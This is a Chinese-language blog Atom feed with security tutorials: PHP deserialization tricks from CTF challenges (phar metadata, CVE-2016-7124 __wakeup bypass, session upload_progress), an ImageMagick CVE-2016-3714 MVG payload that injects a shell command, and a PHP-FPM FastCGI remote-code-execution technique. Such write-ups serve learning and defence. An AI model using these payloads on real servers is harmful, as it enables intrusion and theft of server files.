<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ConsT27&#39;s Blog</title>
  
  <subtitle>库</subtitle>
  <link href="http://yoursite.com/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2021-02-19T08:49:59.164Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>ConsT27</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>php反序列化</title>
    <link href="http://yoursite.com/2021/02/19/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://yoursite.com/2021/02/19/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2021-02-19T09:22:02.409Z</published>
    <updated>2021-02-19T08:49:59.164Z</updated>
    
    <content type="html"><![CDATA[<h1 id="php反序列化基础"><a href="#php反序列化基础" class="headerlink" title="php反序列化基础"></a>php反序列化基础</h1><h2 id="基础："><a href="#基础：" class="headerlink" title="基础："></a>基础：</h2><h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">construct(): 当本对象被创建的时候自动调用，（unserialize()时不会被自动调用）</span><br><span class="line">wakeup():    对象被unserialize()时自动调用</span><br><span class="line">destruct():  当本对象被销毁时自动调用</span><br><span class="line">tostring():  当本对象被当作字符串处理时调用(echo等)</span><br><span class="line">get()&#x2F;set():       当试图获取&#x2F;写入一个不可达到属性或不存在的值时，会自动调用</span><br><span class="line">call():      与get类似，当试图调用一个不可到达方法时调用</span><br><span class="line">sleep&#x2F;wakeup  当对象被序列化&#x2F;反序列化时调用</span><br><span class="line">invoke       当对象被当作函数使用时调用。</span><br></pre></td></tr></table></figure><p>其中，对于to_string()的触发条件有很多：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo&#x2F;print 打印输出对象时</span><br><span class="line">对象与字符串拼接或&#x3D;&#x3D;比较时</span><br><span class="line">对象在经过字符串处理函数如 strlen()strstr()等时以及class_exists()时</span><br></pre></td></tr></table></figure><h3 id="ctf中的反序列化经验"><a href="#ctf中的反序列化经验" class="headerlink" title="ctf中的反序列化经验"></a>ctf中的反序列化经验</h3><p>1.序列化后的结果，一切以var_dump出来的页面的源代码界面为准!,且源代码中的乱码部分hex编码都是00！ 此外 private的序列化后属性名会变为 %00class_name%00shuxing_name protected 的序列化后属性名会变为 %00*%00shuxing_name<br>2.另外一点就是,一个对象被反序列化出来后，他就释放在内存空间成为一个真正存在的对象了<br>3.还有一点是，序列化只会记录属性和值，不会记录函数<br>4.反序列化后不会调用__constrict()</p><h1 id="利用phar文件"><a href="#利用phar文件" class="headerlink" title="利用phar文件"></a>利用phar文件</h1><p>当使用phar文件时，phar文件的meta-data是以序列化的形式存储在phar文件中的.<br><img src="http://www.const27.com/wp-content/uploads/2020/06/clipboar21d-3.png" alt="image"><br>那么如何利用呢</p><h3 id="基本姿势"><a href="#基本姿势" class="headerlink" title="基本姿势:"></a>基本姿势:</h3><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219153247.png" alt="QQ截图20210219153247"></p><p>使用phar://协议访问<br><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219153304.png" alt="QQ截图20210219153304"><br>使用phar://协议，是不用管后缀名，一个jpg文件都可以被phar://协议打开<br>phar://协议访问文件常用 phar://文件路径</p><h3 id="进阶姿势"><a href="#进阶姿势" class="headerlink" title="进阶姿势"></a>进阶姿势</h3><p>1.幻术头加在stub上<br>有些waf是检验文件头的，检验到 ?&gt;是不让过的。所以需要改改stub，在stub的前面加上一些幻术头同时修改文件后缀名来绕过.<br><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219153317.png" alt="QQ截图20210219153317"></p><h3 id="下面是能够触发phar反序列化的函数"><a href="#下面是能够触发phar反序列化的函数" class="headerlink" title="下面是能够触发phar反序列化的函数"></a>下面是能够触发phar反序列化的函数</h3><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219153330.png" alt="QQ截图20210219153330"></p><h2 id="Phar文件创建模板"><a href="#Phar文件创建模板" class="headerlink" title="Phar文件创建模板"></a>Phar文件创建模板</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$phar &#x3D; new Phar(&#39;test.phar&#39;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;addFromString(&#39;test.txt&#39;, &#39;text&#39;);</span><br><span class="line">$phar-&gt;setStub(&#39;&lt;?php __HALT_COMPILER(); ? &gt;&#39;);</span><br><span class="line">$phar-&gt;setMetadata($c);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><h1 id="php版本7-1以上，对类属性检测不严格导致的反序列化问题"><a href="#php版本7-1以上，对类属性检测不严格导致的反序列化问题" class="headerlink" title="php版本7.1以上，对类属性检测不严格导致的反序列化问题"></a>php版本7.1以上，对类属性检测不严格导致的反序列化问题</h1><p>php7.1+反序列化的对象可以直接以public属性的形式对原类中的protected形式的属性进行修改。<br>比如[网鼎杯 2020 青龙组]AreUSerialz一题。其难点在于你必须在反序列化payload中修改一个protected的属性才能拿到flag，但是有一个判断语句让你不能在反序列化payload出现%00字符。 所以此处我们在做payload的时候，把protected属性改成public属性再序列化也行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">    protected $op;</span><br><span class="line">    protected $filename;</span><br><span class="line">    protected $content;</span><br><span class="line"></span><br><span class="line">    public function process() &#123;</span><br><span class="line">        if($this-&gt;op &#x3D;&#x3D; &quot;1&quot;) &#123;</span><br><span class="line">            $this-&gt;write();</span><br><span class="line">        &#125; else if($this-&gt;op &#x3D;&#x3D; &quot;2&quot;) &#123;</span><br><span class="line">            $res &#x3D; $this-&gt;read();</span><br><span class="line">            $this-&gt;output($res);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Bad Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">        private function read() &#123;</span><br><span class="line">        $res &#x3D; &quot;&quot;;</span><br><span class="line">        if(isset($this-&gt;filename)) &#123;</span><br><span class="line">            $res &#x3D; file_get_contents($this-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        return $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        function __destruct() &#123;</span><br><span class="line">        if($this-&gt;op &#x3D;&#x3D;&#x3D; &quot;2&quot;)</span><br><span class="line">            $this-&gt;op &#x3D; &quot;1&quot;;</span><br><span class="line">        $this-&gt;content &#x3D; &quot;&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">function is_valid($s) &#123;</span><br><span class="line">    for($i &#x3D; 0; $i &lt; strlen($s); $i++)</span><br><span class="line">        if(!(ord($s[$i]) &gt;&#x3D; 32 &amp;&amp; ord($s[$i]) &lt;&#x3D; 125))</span><br><span class="line">            return false;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str &#x3D; (string)$_GET[&#39;str&#39;];</span><br><span class="line">    if(is_valid($str)) &#123;</span><br><span class="line">        $obj &#x3D; unserialize($str);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>关键代码放这里。逻辑是从get参数获取数据并反序列化。然后我们通过反序列化payload操控op让它为2并且filename=flag.php。但是我们正常思路制造payload时因为op和filename是proteced属性，难免会有%00字符出现，但是它又让你不能出现%00这种ascii码小于32的字符。所以我们直接把op和filename当作public属性处理也可以直接过去<br>也就是说payload这样写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">new  FileHandler&#123;</span><br><span class="line">    public $op&#x3D;2;</span><br><span class="line">    public $filename&#x3D;&quot;flag.php&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="绕过-wakeup方法-CVE-2016-7124"><a href="#绕过-wakeup方法-CVE-2016-7124" class="headerlink" title="绕过__wakeup方法(CVE-2016-7124)"></a>绕过__wakeup方法(CVE-2016-7124)</h1><p>只需构建一个序列化字段，它的变量数与实际不符即可。<br>像这样O:4:”xctf”:3:{s:4:”flag”;s:3:”111″;s:5:”flsag”;s:3:”111″;}<br>这里本身有2个变量，但在标识变量数时与实际不符，就会绕过__wakeup<br>适用版本:PHP5 &lt; 5.6.25 PHP7 &lt; 7.0.10</p><h1 id="session存储调用与php反序列化引发的安全问题"><a href="#session存储调用与php反序列化引发的安全问题" class="headerlink" title="session存储调用与php反序列化引发的安全问题"></a>session存储调用与php反序列化引发的安全问题</h1><h4 id="1-基础功能"><a href="#1-基础功能" class="headerlink" title="1.基础功能:"></a>1.基础功能:</h4><p>session信息在服务器端存储时，其内容是通过一系列比如通过序列化等操作加工改变了的，而当其被调用时，又能逆加工回原有的内容，这是基础。 session信息在服务器端存储时，其加工方式可以通过php.ini文件的session.save_handler= 参数进行调整。 这个参数的不同值对应的加工方式如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[&#39;name&#39;]&#x3D;$_GET[&#39;name&#39;]  &#x2F;&#x2F;传入参数并在session文件里以name的变量名保存</span><br><span class="line"></span><br><span class="line">ini_set(&#39;session.serialize_handler&#39;,&#39;php&#39;)&#x3D;&gt;abc&#x3D;&gt;name|s:3:&quot;abc&quot;;</span><br><span class="line">&#x2F;&#x2F;变量名|序列化处理后的值 </span><br><span class="line"></span><br><span class="line">ini_set(&#39;session.serialize_handler&#39;,&#39;php_binary&#39;)&#x3D;&gt;abc&#x3D;&gt;#names:4:&quot;abcd&quot;;</span><br><span class="line">&#x2F;&#x2F;#为键名长度对应的ascii字符+变量名+序列化后的值</span><br><span class="line"></span><br><span class="line">ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;)&#x3D;&gt;abc&#x3D;&gt;a:1:&#123;s:4:&quot;name&quot;;s:3:&quot;abc&quot;;&#125;</span><br><span class="line">&#x2F;&#x2F;将变量以数组形式进行序列化处理</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219153504.png" alt="QQ截图20210219153504"></p><h4 id="2-在此基础上利用upload-process机制来实现-“即使没有输入点也能继续触发序列化漏洞”"><a href="#2-在此基础上利用upload-process机制来实现-“即使没有输入点也能继续触发序列化漏洞”" class="headerlink" title="2.在此基础上利用upload_process机制来实现 “即使没有输入点也能继续触发序列化漏洞”"></a>2.在此基础上利用upload_process机制来实现 “即使没有输入点也能继续触发序列化漏洞”</h4><p><strong>注:</strong> 如果没关session.upload_progress.cleanup，每次写入session的内容都会被删，这样的话只能使用条件竞争来搞了  <img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219153528.png" alt="QQ截图20210219153528">上面的话翻译为: 当session.upload_progress.enabled INI选项开启时，你在上传文件的同时POST一个参数值与session.upload_progress.name（默认为PHP_SESSION_UPLOAD_PROGRESS）值的值，会在session里留下session.upload_porgress.prefix与session.upload_progress.name链接的值，而后者的内容就是我们上传的文件的文件名. 试验一下 </p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219154237.png" alt="QQ截图20210219154237"> </p><p>抓包改包: </p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219154309.png" alt="QQ截图20210219154309"></p><p>确实有残留,于是凭此进行上面那条的操作开始反序列化攻击(文件包含也行)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;php反序列化基础&quot;&gt;&lt;a href=&quot;#php反序列化基础&quot; class=&quot;headerlink&quot; title=&quot;php反序列化基础&quot;&gt;&lt;/a&gt;php反序列化基础&lt;/h1&gt;&lt;h2 id=&quot;基础：&quot;&gt;&lt;a href=&quot;#基础：&quot; class=&quot;headerlink</summary>
      
    
    
    
    
    <category term="php开发与安全" scheme="http://yoursite.com/tags/php%E5%BC%80%E5%8F%91%E4%B8%8E%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>imagemagick漏洞任意命令执行（cve-2016-3714）</title>
    <link href="http://yoursite.com/2021/02/19/imagemagick%E6%BC%8F%E6%B4%9E%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88cve-2016-3714%EF%BC%89/"/>
    <id>http://yoursite.com/2021/02/19/imagemagick%E6%BC%8F%E6%B4%9E%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88cve-2016-3714%EF%BC%89/</id>
    <published>2021-02-19T09:22:02.407Z</published>
    <updated>2021-02-19T08:50:02.673Z</updated>
    
    <content type="html"><![CDATA[<p>参考 <a href="https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html">https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html</a></p><h2 id="何为ImageMagick"><a href="#何为ImageMagick" class="headerlink" title="何为ImageMagick"></a>何为ImageMagick</h2><p>简而言之，就是一个处理图片的程序。</p><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>ImageMagick有一个功能叫做 delegate(委托),作用是调用外部的lib处理文件。<br>在ImageMagick的配置文件 /etc/ImageMagick/delegates.xml 可以看到所有的委托(自己去看)</p><p>它的委托一般是长这样的,意思是在处理https图片时，会调用command的里的指令.command里的%m代表一种占位符，%m占位符代表获取https图片的url（当然占位符不仅仅%m一种，还有 比如%i是输入的文件名，%l是图片exif label信息 等等等等)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;delegate decode&#x3D;&quot;https&quot; command&#x3D;&quot;&quot;curl&quot; -s -k -o &quot;%o&quot; &quot;https:%M&quot;&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure><p>ImageMagick默认支持一种图片格式，叫mvg，而mvg与svg格式类似，其中是以文本形式写入矢量图的内容，而这其中就可以包含https处理过程。 所以我们可以构造一个mvg文件(文件名后缀不一定非得.mvg，imagemagick是按照文件内容来区分文件类型的)交给imagemagick处理，在其包含https处使用|或&amp;分割命令，造成rce,如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &#39;url(https:&#x2F;&#x2F;&quot;|mkdir &#x2F;nmsl; &quot;)&#39;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure><p>上面是mvg的一种格式，其中在fill处填入https的url.</p><h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217152837.png" alt="QQ截图20210217152837"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217152846.png" alt="QQ截图20210217152846"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;参考 &lt;a href=&quot;https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html&quot;&gt;https://www.leavesongs.com/PENETRATION/CVE-2016-3714-I</summary>
      
    
    
    
    
    <category term="php开发与安全" scheme="http://yoursite.com/tags/php%E5%BC%80%E5%8F%91%E4%B8%8E%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>FastCgi协议&amp;PHP-FPM未授权导致RCE</title>
    <link href="http://yoursite.com/2021/02/19/FastCgi%E5%8D%8F%E8%AE%AE&amp;PHP-FPM%E6%9C%AA%E6%8E%88%E6%9D%83%E5%AF%BC%E8%87%B4RCE/"/>
    <id>http://yoursite.com/2021/02/19/FastCgi%E5%8D%8F%E8%AE%AE&amp;PHP-FPM%E6%9C%AA%E6%8E%88%E6%9D%83%E5%AF%BC%E8%87%B4RCE/</id>
    <published>2021-02-19T09:22:02.406Z</published>
    <updated>2021-02-19T08:50:05.205Z</updated>
    
    <content type="html"><![CDATA[<p>参考: <a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a> 离别歌</p><h2 id="Fastcgi"><a href="#Fastcgi" class="headerlink" title="Fastcgi"></a>Fastcgi</h2><p>要说PHP-FPM，首先就要说一下Fastcgi协议.</p><p>Fastcgi其实是一个和HTTP本质一样的通信协议。<br>HTTP用于浏览器和服务器中间件通信,Fastcgi用于服务器中间件与某个语言后端通信。<br>Fastcgi协议由多个record组成，record由header和body组成。<br>服务器中间件将body和header按照fastcgi规则封装好发送给语言后端，后端解码后拿到具体数据进行指定的操作，再按fastcgi协议封装号结果返回给服务器</p><p>record Header固定8个字节,每个变量一个字节<br>Body分为两类:真正的内容数据,和额外数据(非必须)<br>一个fastcgi record结构最大支持2^16=65536字节的body</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">  &#x2F;* Header *&#x2F;</span><br><span class="line">  unsigned char version; &#x2F;&#x2F; 版本</span><br><span class="line">  unsigned char type; &#x2F;&#x2F; 本次record的类型</span><br><span class="line">  unsigned char requestIdB1; &#x2F;&#x2F; 本次record对应的请求id</span><br><span class="line">  unsigned char requestIdB0;</span><br><span class="line">  unsigned char contentLengthB1; &#x2F;&#x2F; body体的大小</span><br><span class="line">  unsigned char contentLengthB0;</span><br><span class="line">  unsigned char paddingLength; &#x2F;&#x2F; 额外块大小</span><br><span class="line">  unsigned char reserved; </span><br><span class="line"></span><br><span class="line">  &#x2F;* Body *&#x2F;</span><br><span class="line">  unsigned char contentData[contentLength];</span><br><span class="line">  unsigned char paddingData[paddingLength];</span><br><span class="line">&#125; FCGI_Record;</span><br></pre></td></tr></table></figure><h3 id="Fastcgi-type"><a href="#Fastcgi-type" class="headerlink" title="Fastcgi type"></a>Fastcgi type</h3><p>也就是一个record的type变量。type用于表明该record的作用,以下是type主要的一些值<br><code>type</code>就是指定该record的作用。因为fastcgi一个record的大小是有限的，作用也是单一的，所以我们需要在一个TCP流里传输多个record。通过<code>type</code>来标志每个record的作用，用<code>requestId</code>作为同一次请求的id。</p><p><img src="https://www.leavesongs.com/media/attachment/2017/04/25/e29518b1-3574-426f-b75f-8cabbb89a15a.9efc537226ce.jpg" alt="14931267923354.jpg"></p><p>其中type=4 对我们接下来讲PHP-FPM有重要作用,他有四个不同的结构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">  unsigned char nameLengthB0;  &#x2F;* nameLengthB0  &gt;&gt; 7 &#x3D;&#x3D; 0 *&#x2F;</span><br><span class="line">  unsigned char valueLengthB0; &#x2F;* valueLengthB0 &gt;&gt; 7 &#x3D;&#x3D; 0 *&#x2F;</span><br><span class="line">  unsigned char nameData[nameLength];</span><br><span class="line">  unsigned char valueData[valueLength];</span><br><span class="line">&#125; FCGI_NameValuePair11;</span><br><span class="line"></span><br><span class="line">typedef struct &#123;</span><br><span class="line">  unsigned char nameLengthB0;  &#x2F;* nameLengthB0  &gt;&gt; 7 &#x3D;&#x3D; 0 *&#x2F;</span><br><span class="line">  unsigned char valueLengthB3; &#x2F;* valueLengthB3 &gt;&gt; 7 &#x3D;&#x3D; 1 *&#x2F;</span><br><span class="line">  unsigned char valueLengthB2;</span><br><span class="line">  unsigned char valueLengthB1;</span><br><span class="line">  unsigned char valueLengthB0;</span><br><span class="line">  unsigned char nameData[nameLength];</span><br><span class="line">  unsigned char valueData[valueLength</span><br><span class="line">          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];</span><br><span class="line">&#125; FCGI_NameValuePair14;</span><br><span class="line"></span><br><span class="line">typedef struct &#123;</span><br><span class="line">  unsigned char nameLengthB3;  &#x2F;* nameLengthB3  &gt;&gt; 7 &#x3D;&#x3D; 1 *&#x2F;</span><br><span class="line">  unsigned char nameLengthB2;</span><br><span class="line">  unsigned char nameLengthB1;</span><br><span class="line">  unsigned char nameLengthB0;</span><br><span class="line">  unsigned char valueLengthB0; &#x2F;* valueLengthB0 &gt;&gt; 7 &#x3D;&#x3D; 0 *&#x2F;</span><br><span class="line">  unsigned char nameData[nameLength</span><br><span class="line">          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];</span><br><span class="line">  unsigned char valueData[valueLength];</span><br><span class="line">&#125; FCGI_NameValuePair41;</span><br><span class="line"></span><br><span class="line">typedef struct &#123;</span><br><span class="line">  unsigned char nameLengthB3;  &#x2F;* nameLengthB3  &gt;&gt; 7 &#x3D;&#x3D; 1 *&#x2F;</span><br><span class="line">  unsigned char nameLengthB2;</span><br><span class="line">  unsigned char nameLengthB1;</span><br><span class="line">  unsigned char nameLengthB0;</span><br><span class="line">  unsigned char valueLengthB3; &#x2F;* valueLengthB3 &gt;&gt; 7 &#x3D;&#x3D; 1 *&#x2F;</span><br><span class="line">  unsigned char valueLengthB2;</span><br><span class="line">  unsigned char valueLengthB1;</span><br><span class="line">  unsigned char valueLengthB0;</span><br><span class="line">  unsigned char nameData[nameLength</span><br><span class="line">          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];</span><br><span class="line">  unsigned char valueData[valueLength</span><br><span class="line">          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];</span><br><span class="line">&#125; FCGI_NameValuePair44;</span><br></pre></td></tr></table></figure><ol><li>key、value均小于128字节，用<code>FCGI_NameValuePair11</code></li><li>key大于128字节，value小于128字节，用<code>FCGI_NameValuePair41</code></li><li>key小于128字节，value大于128字节，用<code>FCGI_NameValuePair14</code></li><li>key、value均大于128字节，用<code>FCGI_NameValuePair44</code></li></ol><h2 id="PHP-FPM"><a href="#PHP-FPM" class="headerlink" title="PHP-FPM"></a>PHP-FPM</h2><p>FPM是Fastcgi协议的解析器.中间件以fastcgi协议把用户传来的数据封装传给FPM。下面这个图就是fastcgi协议的模样</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219142802.png" alt="QQ截图20210219142802"></p><p>键值对.即fastcgi的type=4，这就是上面专门说这个的目的.<br>其中script_filename只向要执行的php文件</p><h2 id="Nginx-IIS7-解析漏洞深入"><a href="#Nginx-IIS7-解析漏洞深入" class="headerlink" title="Nginx(IIS7)解析漏洞深入"></a>Nginx(IIS7)解析漏洞深入</h2><p>以前记录过这个中间件漏洞，但没有详细的去了解为什么。这里就说说</p><p>在php fix_pathinfo开启的情况下,传入 url/1.txt/.php时,1.txt会被当作php文件解析.</p><p>究其原因，是因为配置文件中 security.limit_extensions默认限定了.php后缀文件才交给php-fpm处理,传入给fpm的数据是类似这样的</p><p><img src="http://www.const27.com/wp-content/uploads/2020/06/%E5%9B%BE%E7%89%87-67.png" alt="img"></p><p>按理说应该报错404吧，但是fix_pathinfo会判断这个SCRIPT_FILENAME是否存在，若不存在就会去掉最后一个/后面的内容再次判断，知道文件存在为止，再把该文件当作PHP文件执行</p><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>上面那个解析漏洞只是个题外话。<br>我们来讲讲RCE。服务器默认PHP-FPM端口是9000，如果这个端口暴露在公网，我们就可以自己构造fastcgi协议与fpm通信.</p><p>此时我们就能想出rce的雏形，控制SCRIPT_FILENAME去执行我们的shell，反弹个shell什么的，但是前提是我们必须得上传一个shell上去，太笨比，于是我们继续思考.</p><p>上面提到我们可以通过fastcgi协议临时更改PHP的一些配置项(环境参数).我们不如把 <code>auto_prepend_file</code>或<code>auto_append_file</code>(自动包含某文件) 设置为php://input(需allow_url_include=on),然后SCRIPT_FILENAME设置为任意一个服务器上存在的PHP文件（PHP文件不仅仅在服务器目录才会有，PHP程序目录下也会有PHP文件），即可通过控制POST的包体来实现RCE。就像这样</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219142817.png" alt="QQ截图20210219142817"></p><p>exp: <a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219142836.png" alt="QQ截图20210219142836"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;参考: &lt;a href=&quot;https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html&quot;&gt;https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.</summary>
      
    
    
    
    
    <category term="php开发与安全" scheme="http://yoursite.com/tags/php%E5%BC%80%E5%8F%91%E4%B8%8E%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>PHP disablefunctions绕过</title>
    <link href="http://yoursite.com/2021/02/19/DisableFunctions%E7%BB%95%E8%BF%87/"/>
    <id>http://yoursite.com/2021/02/19/DisableFunctions%E7%BB%95%E8%BF%87/</id>
    <published>2021-02-19T09:22:02.404Z</published>
    <updated>2021-02-19T08:50:07.317Z</updated>
    
